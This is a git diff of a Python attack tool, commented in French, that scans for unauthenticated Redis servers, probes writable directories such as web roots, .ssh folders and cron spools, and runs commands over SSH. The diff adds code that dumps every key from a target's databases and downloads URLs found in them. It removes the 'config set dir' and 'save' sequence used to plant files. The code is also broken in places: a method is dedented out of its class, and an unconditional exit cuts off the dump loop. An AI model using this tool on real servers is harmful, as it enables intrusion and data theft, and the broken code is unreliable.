@@ -6,11 +6,6 @@ Description : Ce code exploite les serveurs Redis non authentifiés pour la séc
               Il cherche des répertoires vulnérables et exécute des commandes via SSH.
 Auteur      : ZarTek-Creole
 Date        : 06-12-23
-Source      :
-        - https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419
-        - http://antirez.com/news/96
-        - https://rioasmara.com/2023/04/07/redis-rce-post-exploitation/
-        - https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
 """
 
 import argparse
@@ -35,66 +30,20 @@ class RedisConfig:
     DEFAULT_SSH_KEY = 'id_ed25519.pub'
     DEFAULT_TIMEOUT = 5
     VULNERABLE_DIRECTORIES = [
-        "/var/www/html", "/home/redis/.ssh", "/var/lib/redis/.ssh",
-        "/var/spool/cron/crontabs", "/var/spool/cron", "/etc"
+        "/usr/share/nginx/html", "/var/www/html", "/var/www/phpMyAdmin",
+        "/home/redis/.ssh", "/var/lib/redis/.ssh",
+        "/var/spool/cron/crontabs", "/var/spool/cron",
+        "/home"
     ]
-    REDIS_COMMANDS = [
-        'config set dbfilename backup.db',
-        'config set dir',
-        'config set dbfilename dump.rdb',
-        'save'
-    ]
-    # Modèle d'expression régulière pour vérifier si une URL est présente
-    REGEXP_URI = r'''(?xi)
-        \b
-        (							# Capture 1: entire matched URL
-          (?:
-            https?:				# URL protocol and colon
-            (?:
-              /{1,3}						# 1-3 slashes
-              |								#   or
-              [a-z0-9%]						# Single letter or digit or '%'
-              								# (Trying not to match e.g. "URI::Escape")
-            )
-            |							#   or
-            							# looks like domain name followed by a slash:
-            [a-z0-9.\-]+[.]
-            (?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj| Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)
-            /
-          )
-          (?:							# One or more:
-            [^\s()<>{}\[\]]+						# Run of non-space, non-()<>{}[]
-            |								#   or
-            \([^\s()]*?\([^\s()]+\)[^\s()]*?\)  # balanced parens, one level deep: (…(…)…)
-            |
-            \([^\s]+?\)							# balanced parens, non-recursive: (…)
-          )+
-          (?:							# End with:
-            \([^\s()]*?\([^\s()]+\)[^\s()]*?\)  # balanced parens, one level deep: (…(…)…)
-            |
-            \([^\s]+?\)							# balanced parens, non-recursive: (…)
-            |									#   or
-            [^\s`!()\[\]{};:'".,<>?«»“”‘’]		# not a space or one of these punct chars
-          )
-          |					# OR, the following to match naked domains:
-          (?:
-            (?<!@)			# not preceded by a @, avoid matching foo@_gmail.com_
-            [a-z0-9]+
-            (?:[.\-][a-z0-9]+)*
-            [.]
-            (?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj| Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)
-            \b
-            /?
-            (?!@)			# not succeeded by a @, avoid matching "foo.na" in "foo.na@example.com"
-          )
-        )'''
-    # Modèle d'expression régulière pour rechercher la commande base64
-    REGEXP_BASE64 = r'echo\s(.*?)\|base64\s-d'
+    REGEXP_URI = re.compile(
+        r"https?://[^\s/$.?#].[^\s]*"
+    )
+    REGEXP_BASE64 = re.compile(r'echo\s(.*?)\|base64\s-d')
 
 
 class ExitOnErrorHandler(logging.StreamHandler):
     def emit(self, record: logging.LogRecord):
-        super().emit(record)  # Permet l'affichage normal du log
+        super().emit(record)
         if record.levelno >= logging.ERROR:
             sys.exit(1)
 
@@ -105,6 +54,160 @@ def configure_logging(is_verbose: bool):
         level=logging.DEBUG if is_verbose else logging.INFO,
         handlers=[ExitOnErrorHandler()]
     )
+
+
+class FileHandler:
+    @staticmethod
+    def read_lines(file_path: str) -> List[str]:
+        with open(file_path, 'r', encoding='utf-8') as file:
+            return file.readlines()
+
+    @staticmethod
+    def write_lines(file_path: str, lines: List[str]):
+        with open(file_path, 'w', encoding='utf-8') as file:
+            file.writelines(lines)
+
+    @staticmethod
+    def write_binary(file_path: str, data: bytes):
+        with open(file_path, 'wb') as file:
+            file.write(data)
+
+
+class RedisUtility:
+    def __init__(self, ip_address: str, port: int, binary_redis: str):
+        self.ip_address = ip_address
+        self.port = port
+        self.binary_redis = binary_redis
+
+    @staticmethod
+    def decode_base64(text: str) -> str:
+        try:
+            return base64.b64decode(text.encode('utf-8')).decode('utf-8').replace('\n', ' ')
+        except Exception:
+            return text
+
+    @staticmethod
+    def replace_base64(match):
+        base64_command = match.group(1)
+        decoded_command = RedisUtility.decode_base64(base64_command)
+        return f'echo {decoded_command}' if decoded_command != base64_command else match.group(0)
+
+    @staticmethod
+    def decode_and_replace_base64(text: str) -> str:
+        return RedisConfig.REGEXP_BASE64.sub(RedisUtility.replace_base64, text)
+
+    @staticmethod
+    def extract_variables(lines: List[str]) -> dict:
+        variables = {}
+        for line in lines:
+            if '=' in line and '$(' in line and ')' in line:
+                var_name, var_value = line.split('=', 1)
+                var_value = var_value.strip()
+                if var_value.startswith('$(') and var_value.endswith(')'):
+                    var_value = var_value[2:-1]
+                variables[var_name.strip()] = var_value
+        return variables
+
+    def replace_variables_and_urls(self, file_path: str):
+        lines = FileHandler.read_lines(file_path)
+        variables = self.extract_variables(lines)
+
+        for i, line in enumerate(lines):
+            for var_name, var_value in variables.items():
+                line = line.replace(f"${{{var_name}}}", f"$({var_value})").replace(f"${var_name}", f"$({var_value})")
+            if 'echo ' in line and '|base64 -d' not in line:
+                potential_urls = RedisConfig.REGEXP_URI.findall(line)
+                for url in potential_urls:
+                    line = line.replace(f'echo {url}', url)
+            lines[i] = line
+
+        FileHandler.write_lines(file_path, lines)
+
+    def redis_get_dump_parser(self, key_value: str) -> str:
+        return self.decode_and_replace_base64(key_value) if "base64 -d" in key_value else key_value
+
+    @staticmethod
+    def download_file(url: str, file_path: str) -> bool:
+        response = requests.get(url)
+        if response.status_code == 200:
+            FileHandler.write_binary(file_path, response.content)
+            logging.info(f"File downloaded from {url} and saved as {file_path}")
+            return True
+        else:
+            logging.info(f"Failed to download from {url}, HTTP status {response.status_code}")
+            return False
+
+    def download_and_replace_lines(self, url: str, original_file_path: str, modified_file_path: str):
+        if self.download_file(url, original_file_path):
+            self.replace_variables_and_urls(modified_file_path)
+
+    def redis_get_dump_parser_url(self, key_value: str, path: str):
+        urls = RedisConfig.REGEXP_URI.findall(key_value)
+        for url in urls:
+            file_name = os.path.basename(url)
+            original_file_path = os.path.join(path, file_name)
+            modified_file_path = os.path.join(path, f"modified_{file_name}")
+            self.download_and_replace_lines(url, original_file_path, modified_file_path)
+
+
+    def redis_get_modules(self) -> Tuple[bool, str]:
+        success, serveur_message = self.execute_command_redis(["MODULE", "LIST"])
+        if success and serveur_message is not '':
+            logging.info("List des modules : %s", serveur_message)
+            return True, serveur_message
+        logging.debug("List des modules : Aucun module trouvé")
+        return False, "Aucun module trouvé"
+
+    def redis_get_dump(self) -> Tuple[bool, str]:
+        if not os.path.isdir("dumps"):
+            os.mkdir("dumps")
+            logging.info("Created 'dumps' directory in the current directory.")
+        redis_conn = redis.StrictRedis(self.ip_address, self.port, db=0)
+        dbs = redis_conn.info('keyspace').keys()
+        for db in dbs:
+            db_number = int(db[2:])
+            print(db_number)
+            rdb_filename = f'db_{self.ip_address}_{db_number}.rdb'
+            redis_conn.select(db_number)
+            redis_conn.bgsave(rdb_filename)
+            sys.exit(0)
+            while redis_conn.info("persistence")["rdb_bgsave_in_progress"]:
+                time.sleep(1)
+            logging.info(f"Database {db_number} exported to {rdb_filename}")
+
+            keys = redis_conn.keys("*")
+            dump_path = os.path.join("dumps", f"{self.ip_address}")
+            os.makedirs(dump_path, exist_ok=True)
+            for key in keys:
+                key_data = self.redis_get_dump_parser(redis_conn.get(key).decode("utf-8"))
+                self.redis_get_dump_parser_url(key_data, dump_path)
+                FileHandler.write_lines(os.path.join(dump_path, f"{key}.dump"), [key_data])
+                logging.info(f"Key {key} exported")
+
+        redis_conn.close()
+        return True, "OK"
+
+    def execute_command_redis(self, redis_command: List[str]) -> Tuple[bool, str]:
+        logging.debug("Redis execute_command: %s", redis_command)
+        command = [self.binary_redis, "-h", self.ip_address, "-p", str(self.port)] + redis_command
+        success, stdout_output, stderr_output = self.execute_command(command)
+        return (True, stdout_output) if success else (False, stderr_output)
+
+    @staticmethod
+    def execute_command(command: List[str]) -> Tuple[bool, str, str]:
+        try:
+            process = subprocess.Popen(
+                command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                universal_newlines=True,
+            )
+            stdout, stderr = process.communicate()
+            return (True, stdout.strip(), stderr.strip()) if process.returncode == 0 else (False, stdout.strip(), stderr.strip())
+        except subprocess.CalledProcessError as e:
+            return False, "", str(e)
+        except Exception as e:
+            return False, "", str(e)
 
 
 class RedisServerManager:
@@ -124,6 +227,7 @@ class RedisServerManager:
         self.timeout = timeout
         self.directory_path = self._determine_directory_path(user)
         self.binary_redis = self._check_binary()
+        self.redis_utility = RedisUtility(ip_address, port, self.binary_redis)
 
     @staticmethod
     def _derive_ssh_key_private(ssh_key: str) -> str:
@@ -177,9 +281,14 @@ class RedisServerManager:
             self.directory_path,
         )
         success, msg = self.redis_get_banner()
+
         if not success:
             return False, msg
-        success, msg = self.redis_get_dump()
+        success, msg = self.redis_utility.redis_get_modules()
+
+        if not success:
+            return False, msg
+        success, msg = self.redis_utility.redis_get_dump()
         if not success:
             return False, msg
 
@@ -192,13 +301,15 @@ class RedisServerManager:
         # if not success:
         #     return False, msg
         # return self.execute_redis_commands()
+        return True, "Finished"
 
     def redis_get_banner(self) -> Tuple[bool, str]:
-        success, data = self.execute_command_redis(["INFO"])
+        success, data = self.redis_utility.execute_command_redis(["INFO"])
         if not success:
             return False, data
         redis_version = re.search(r"redis_version:(.*?)\n", data).group(1)
         redis_os = re.search(r"os:(.*?)\n", data).group(1)
+        redis_role = re.search(r"role:(.*?)\n", data).group(1)
 
         uptime_in_seconds = int(re.search(r"uptime_in_seconds:(\d+)\n", data).group(1))
         # Créez un objet timedelta à partir du nombre d'uptime en secondes
@@ -219,201 +330,14 @@ class RedisServerManager:
         logging.info(f"Redis Version: {redis_version}")
         logging.info(f"Redis Operating System: {redis_os}")
 
+        logging.info(f"Redis Role: {redis_role}")
+
         # Affichez la durée
         logging.info(f"Uptime in Seconds: {uptime_in_seconds} ({uptime_str})")
         logging.info(f"Used Memory: {used_memory} bytes")
         logging.info(f"Total Connections Received: {total_connections_received}")
         logging.info(f"Total Commands Processed: {total_commands_processed}")
         return True, "OK"
-
-    def redis_get_dump_parser(self, key_value):
-        if "base64 -d" in key_value:
-            key_value = self.decode_and_replace_base64(key_value)
-        return key_value
-
-    def replace_variables_with_values(self, file_path):
-        # Étape 1: Lecture du fichier et stockage des variables
-        variables = {}
-        with open(file_path, 'r', encoding='utf-8') as file:
-            lines = file.readlines()
-
-        # Identifier et stocker les déclarations de variables
-        for line in lines:
-            if '=' in line and '$(' in line and ')' in line:
-                var_name, var_value = line.split('=', 1)
-                var_value = var_value.strip()
-                if var_value.startswith('$(') and var_value.endswith(')'):
-                    var_value = var_value[2:-1]  # Enlever les symboles $() pour garder la valeur
-                variables[var_name.strip()] = var_value
-
-        # Étape 2: Remplacer les occurrences des variables par leurs valeurs
-        with open(file_path, 'w', encoding='utf-8') as file:
-            for line in lines:
-                for var_name, var_value in variables.items():
-                    if f"${{{var_name}}}" in line or f"${var_name}" in line:
-                        # Ajouter $(...) autour de la valeur de la variable
-                        line = line.replace(f"${{{var_name}}}", f"$({var_value})").replace(f"${var_name}", f"$({var_value})")
-                file.write(line)
-
-    def download_and_replace_lines(self, url, original_file_path, modified_file_path):
-        try:
-            response = requests.get(url)
-            if response.status_code == 200:
-                # Téléchargez le contenu du fichier
-                file_content = response.text
-
-                # Copiez le contenu dans un fichier temporaire
-                with open(modified_file_path, 'w', encoding='utf-8') as modified_file:
-                    # Parcourez les lignes du fichier d'origine
-                    for line in file_content.split('\n'):
-                        # Vérifiez si la ligne doit être remplacée
-                        if "|base64 -d" in line:
-                            # Extraire la commande base64
-                            base64_command_match = re.search(r'echo\s(.*?)\|base64 -d', line)
-                            if base64_command_match:
-                                base64_command = base64_command_match.group(1)
-                                decoded_data = base64.b64decode(base64_command.encode('utf-8')).decode('utf-8').strip()
-                                # Remplacez la ligne par la version décodée
-                                line = re.sub(r'echo\s.*?\|base64 -d', f'echo {decoded_data}', line)
-
-                        # Écrivez la ligne dans le fichier modifié
-                        modified_file.write(line + '\n')
-
-                logging.info(f"Fichier téléchargé depuis {url} et lignes modifiées enregistrées sous {modified_file_path}")
-            else:
-                logging.info(f"Échec du téléchargement depuis {url}, statut HTTP {response.status_code}")
-        except Exception as e:
-            logging.info(f"Erreur lors du téléchargement depuis {url}: {str(e)}")
-
-    def redis_get_dump_parser_url(self, key_value, path):
-
-        # Recherchez toutes les correspondances dans le texte
-        urls = re.findall(RedisConfig.REGEXP_URI, key_value)
-        for url in urls:
-            try:
-                response = requests.get(url)
-                if response.status_code == 200:
-                    # Construisez le chemin complet du fichier à enregistrer
-                    file_name = os.path.basename(url)
-                    file_path_original = os.path.join(path, file_name)
-                    file_path_modified = os.path.join(path, f"modified_{file_name}")
-
-                    # Enregistrez le contenu téléchargé dans le fichier original
-                    with open(file_path_original, 'wb') as file:
-                        file.write(response.content)
-
-                    logging.info(f"Fichier téléchargé depuis {url} et enregistré sous {file_path_original}")
-
-                    # Utilisez la fonction pour télécharger et remplacer les lignes
-                    self.download_and_replace_lines(url, file_path_original, file_path_modified)
-                    self.replace_variables_with_values(file_path_modified)
-                    self.replace_variables_and_urls(file_path_modified)
-
-                else:
-                    logging.info(f"Échec du téléchargement depuis {url}, statut HTTP {response.status_code}")
-            except Exception as e:
-                logging.info(f"Erreur lors du téléchargement depuis {url}: {str(e)}")
-
-    def replace_variables_and_urls(self, file_path):
-        # Étape 1: Lecture du fichier et stockage des variables
-        variables = {}
-        with open(file_path, 'r', encoding='utf-8') as file:
-            lines = file.readlines()
-
-        # Identifier et stocker les déclarations de variables
-        for line in lines:
-            if '=' in line and '$(' in line and ')' in line:
-                var_name, var_value = line.split('=', 1)
-                var_value = var_value.strip()
-                if var_value.startswith('$(') and var_value.endswith(')'):
-                    var_value = var_value[2:-1]  # Enlever les symboles $() pour garder la valeur
-                variables[var_name.strip()] = var_value
-
-        # Étape 2: Remplacer les occurrences des variables et les URLs
-        with open(file_path, 'w', encoding='utf-8') as file:
-            for line in lines:
-                for var_name, var_value in variables.items():
-                    if f"${{{var_name}}}" in line or f"${var_name}" in line:
-                        line = line.replace(f"${{{var_name}}}", f"$({var_value})").replace(f"${var_name}", f"$({var_value})")
-
-                # Vérifier et remplacer les URLs dans les commandes echo
-                if 'echo ' in line and '|base64 -d' not in line:
-                    potential_urls = re.findall(RedisConfig.REGEXP_URI, line)
-                    for url in potential_urls:
-                        line = line.replace(f'echo {url}', url)
-
-                file.write(line)
-
-    def decode_and_replace_base64(self, text):
-
-        def replace(match):
-            base64_command = match.group(1)
-            try:
-                # Décodez la commande base64
-                decoded_command = base64.b64decode(base64_command.encode('utf-8')).decode('utf-8')
-                # Supprimez les retours à la ligne indésirables
-                decoded_command = decoded_command.replace('\n', ' ')
-                return f'echo {decoded_command}'
-            except Exception:
-                # En cas d'erreur lors du décodage, retournez la ligne originale
-                return match.group(0)
-
-        # Recherchez et remplacez la commande base64 dans le texte
-        modified_text = re.sub(RedisConfig.REGEXP_BASE64, replace, text)
-
-        return modified_text
-
-    def redis_get_dump(self) -> Tuple[bool, str]:
-        if not os.path.isdir("dumps"):
-            os.mkdir("dumps")
-            logging.info("Création du répertoire 'dumps' dans le répertoire courant.")
-        redis_conn = redis.StrictRedis(self.ip_address, self.port, db=0)
-        dbs = redis_conn.info('keyspace').keys()
-        for db in dbs:
-            db_number = int(db[2:])
-            rdb_filename = f'db_{self.ip_address}_{db_number}.rdb'
-            redis_conn.select(db_number)
-            redis_conn.bgsave()
-            while True:
-                info = redis_conn.info("persistence")
-                if info["rdb_bgsave_in_progress"] == 0:
-                    break
-                time.sleep(1)
-            logging.info(f"Base de données {db_number} exportée vers {rdb_filename}")
-
-            # Liste des clés
-            keys = redis_conn.keys("*")
-            dumpPath = os.path.join("dumps", f"{self.ip_address}")
-            if not os.path.isdir(dumpPath):
-                os.mkdir(dumpPath)
-            # Parcourir chaque clé et les sauvegarder dans des fichiers individuels
-            for key in keys:
-                key_bytes = redis_conn.get(key)
-                key_value = key_bytes.decode("utf-8")
-                key_data = self.redis_get_dump_parser(key_value)
-                self.redis_get_dump_parser_url(key_data, dumpPath)
-                with open(os.path.join(dumpPath, f"{key}.dump"), 'w', encoding='utf-8') as key_file:
-                    key_file.write(key_data)  # Écrire la chaîne en UTF-8
-
-                logging.info(f"Clé {key} exportée")
-
-        redis_conn.close()
-        return True, "OK"
-
-    def execute_command_redis(self, redis_command: List[str]):
-        logging.debug("Commande Redis execute_command : %s", redis_command)
-        command = [
-            self.binary_redis,
-            "-h",
-            self.ip_address,
-            "-p",
-            str(self.port),
-        ] + redis_command
-        success, stdout_output, stderr_output = self.execute_command(command)
-        if success:
-            return True, stdout_output
-        else:
-            return False, stderr_output
 
     def find_vulnerable_directory(self) -> Tuple[bool, str]:
         for directory in RedisConfig.VULNERABLE_DIRECTORIES:
@@ -430,26 +354,11 @@ class RedisServerManager:
             "dir",
             directory
         ]
-        success, server_message = self.execute_command_redis(command)
+        success, server_message = self.redis_utility.execute_command_redis(command)
         if server_message.startswith("ERR "):
             return False
         logging.info("--------------------- %s-------------------- %s", server_message, command)
         return success
-
-    def execute_redis_commands(self) -> Tuple[bool, str]:
-        for cmd in RedisConfig.REDIS_COMMANDS:
-            command = [
-                self.binary_redis,
-                "-h",
-                self.ip_address,
-                "-p",
-                str(self.port),
-            ] + cmd.split()
-            logging.debug("Commande Redis execute_redis_commands : %s", command)
-            success, stdout_output, stderr_output = self.execute_command(command)
-            if not success:
-                return False, stderr_output
-            return self.execute_ssh_command()
 
     def execute_command(self, command: List[str]) -> Tuple[bool, str, str]:
         logging.debug("Commande execute_command: %s", command)
@@ -481,16 +390,17 @@ class RedisServerManager:
             return False, result.stderr.strip()
         return True, "Commande exécutée avec succès."
 
-    def execute_ssh_command(self) -> Tuple[bool, str]:
-        ssh_command = self.build_ssh_command()
-        logging.debug("Commande SSH : %s", ssh_command)
-        success, stdout_output, stderr_output = self.execute_command(ssh_command)
-        if success:
-            logging.info("Commande réussie. Sortie standard : %s" % stdout_output)
-            return True, "Commande exécutée avec succès."
-        else:
-            logging.info("Erreur : %s" % stderr_output)
-            return False, stderr_output
+
+def execute_ssh_command(self) -> Tuple[bool, str]:
+    ssh_command = self.build_ssh_command()
+    logging.debug("Commande SSH : %s", ssh_command)
+    success, stdout_output, stderr_output = self.execute_command(ssh_command)
+    if success:
+        logging.info("Commande réussie. Sortie standard : %s", stdout_output)
+        return True, "Commande exécutée avec succès."
+    else:
+        logging.info("Erreur : %s", stderr_output)
+        return False, stderr_output
 
     def build_ssh_command(self) -> List[str]:
         return [
@@ -528,9 +438,9 @@ def process_scan(scan: str, port: str, user: str, ssh_key: str, timeout: int):
     except subprocess.CalledProcessError:
         logging.error("Le client masscan n'est pas installé. Veuillez installer un client masscan (ex. : 'apt install masscan').")
 
-        manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
-        success, message = manager.process_server()
-        logging.info(f"IP {ip_address} - Résultat : {success}, Message : {message}")
+        # manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
+        # success, message = manager.process_server()
+        # logging.info(f"IP {ip_address} - Résultat : {success}, Message : {message}")
 
 
 def parse_arguments() -> argparse.Namespace:
